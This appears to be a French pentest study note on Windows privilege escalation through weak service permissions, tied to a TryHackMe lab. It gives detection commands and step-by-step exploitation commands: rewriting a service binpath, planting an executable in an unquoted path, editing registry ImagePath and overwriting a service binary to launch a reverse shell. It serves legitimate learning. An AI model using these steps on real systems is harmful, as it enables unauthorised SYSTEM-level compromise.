---
public: true
---

**Détails de Recherche de vecteur d'escalade via des services : [[Weak Permissions]]**

Exercices détaillant de nombreuses méthodes de privesc : <https://tryhackme.com/room/windows10privesc>

## Trouver un service vulnérable (automatique)

`WinPeas` identifie tous les services vulnérables.

Il faut regarder les sections suivantes :

```shell
# Information sur les services
===============(Services Information)=============

# Information sur les Applications (à recouper avec les chemin d'accès des services)
===========(Applications Information)================
```

## Permissions de modifier un service

Si on peut modifier un service, on pourra remplacer le processus lancé par un reverse shell.

### Detection

#### Manuelle

```shell
accesschk -accepteula -quwc daclsvc
daclsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  RW Everyone                          <====================
```

#### Automatique

Dans les résultats de la commande `.\winPEASany.exe quiet servicesinfo applicationsinfo` :

```shell
===============(Services Information)=============
 daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles       <=====
```

### Exploitation

```shell
# Changement du path du service
net stop daclsvc
sc config daclsvc binpath= "\"C:\Windows\Temp\reverse.exe\""
net start daclsvc
```

## Unquoted service path
### Détection
#### Manuelle

Enuméré les services, et selectioner ceux qui ne commencent pas par des guillemets.

Exemple avec le path : `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`

```shell
# vérification avec icacls des différent chemins exploitables
"C:\Program Files\Unquoted Path Service\Common.exe"
"C:\Program Files\Unquoted.exe"
"C:\Program.exe"

# tenter de créer un fichier :
echo "test" > "C:\Program Files\Unquoted Path Service\Common.exe"
del "C:\Program Files\Unquoted Path Service\Common.exe"
# si pas d'erreur alors c'est exploitable

```

Remarque : On doit pouvoir le faire avec `icacls` ou `accesschk.exe` mais je n'ai pas pris le temps de creuser pour obtenir une méthode fiable.

#### Automatique

```shell
===============(Services Information)=============
[...]
unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - 
No quotes and Space detected
   =================================================================================================                                <=====
[...]

=========(Applications Information)=======
[...]
C:\Program Files\Unquoted Path Service(Users [AllAccess])       <====
[...]
```

### Exploitation

```shell
copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net stop unquotedsvc
net start unquotedsvc
```

## Weak registry permissions

### Detection

#### Manuelle

```shell
# trouver un groupe dont on est membre dans la liste fournie par la commande :
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

#### Automatique

```shell
==============(Services Information)===============
[...]
 LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
 daclsvc: WriteData/CreateFiles
```

### Exploitation

```shell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
net start regsvc
```

## Insecure service Executable

### Detection

#### Manuelle

```shell
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

#### Automatique

```shell

```

### Exploitation

```shell
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

net start filepermsvc
```

## Trouver un service vulnérable (manuel)

### Lister les services

Lorsqu'on liste les service, on recherche en priorité des **chemins d'accès atypiques** qui potentiellement  seront moins bien conçus que les services natif au système d'exploitation :

Hors du dossier `c:\windows`

```powershell
get-wmiobject win32_service | select name,state, startmode,pathname,StartName | ?{$_.StartName -eq "LocalSystem" -and $_.pathname -notlike "c:\Windows\*" }| Sort PathName |ft
```

```shell
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
```

Tous les services

```powershell
get-wmiobject win32_service | select name,state, startmode,pathname,StartName | ?{$_.StartName -eq "LocalSystem" -and $_.pathname -notlike "C:\Windows\system32\svchost.exe *" }| Sort PathName |ft
```

### Regardes les permissions

#### Droits de modification d'éléments dans le path

Prenons l'exemple du service suivant :

```
C:\Program Files\Super Vendor\Great Product\superservice.exe
```

On cherchera si on peut créer les exécutables suivants :

- `C:\Program Files\Super Vendor\Great.exe`
- `C:\Program Files\Super.exe`
- `C:\Program.exe`

On vérifie donc les permission sur les dossiers parents de ces fichier potentiels :

```shell
# REMARQUE : pour les dossiers, il ne faut pas ajouter de "\" à la fin !
icacls "C:\Program Files\Super Vendor"
icacls "C:\Program Files"
icacls "C:\"
```

Exemple de permissions :

```shell
# peut créer des Dossiers MAIS PAS des fichiers
CREATOR OWNER:(OI)(CI)(IO)(F) 
# peut créer des dossiers ET des fichiers !! (exploitable)

CREATOR OWNER:(I)(OI)(CI)(IO)(F)

```

#### Unquoted service path

Pour ce type de mauvaise configuration, on cherchera des services dont le chemin d'accès :

- n'est pas entouré de "doubles quotes" (guillemets)
- contient des dossier contenant des espaces dans leur nom

### Services en dehors de c:\windows\system32

```powershell
# démarrés ou non
get-wmiobject win32_service | select name,state, startmode,pathname,StartName | ?{$_.StartName -eq "LocalSystem" -and $_.pathname -notlike "c:\Windows\System32\*" }|ft


# Rechercher des chemins d'accès atypiques 
get-wmiobject win32_service | select name,state, startmode,pathname,StartName |?{$_.State -like 'Running'}|Sort StartName | ft

  
# Liste des services sans ceux dans c:\windows :
get-wmiobject win32_service | select name,state,pathname |?{$_.State -like 'Running'} |? {$_.Pathname -notmatch 'c:\\Windows\\.*' }

# Vérifier les permissions
> icacls 'C:\Program Files\Ext2Fsd\Ext2Srv.exe'
C:\Program Files\Ext2Fsd\Ext2Srv.exe AUTORITE NT\Système:(I)(F)
                                     BUILTIN\Administrateurs:(I)(F)
                                     BUILTIN\Utilisateurs:(I)(RX)
                                     AUTORITÉ DE PACKAGE D’APPLICATION\TOUS LES PACKAGES D’APPLICATION:(I)(RX)
                                     AUTORITÉ DE PACKAGE D’APPLICATION\TOUS LES PACKAGES D’APPLICATION RESTREINTS:(I)(RX)

```

[Documentation icacls](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)

- A sequence of simple rights (basic permissions):
	- F - Full access
	- M - Modify access
	- RX - Read and execute access
	- R - Read-only access
	- W - Write-only access
- Inheritance rights may precede either `<perm>` form:
	- **(I)** - Inherit. ACE inherited from the parent container.
	- (OI)** - Object inherit. Objects in this container will inherit this ACE. Applies only to directories.
	- **(CI)** - Container inherit. Containers in this parent container will inherit this ACE. Applies only to directories.
	- **(IO)** - Inherit only. ACE inherited from the parent container, but does not apply to the object itself. Applies only to directories.
	- **(NP)** - Do not propagate inherit. ACE inherited by containers and objects from the parent container, but does not propagate to nested containers. Applies only to directories.
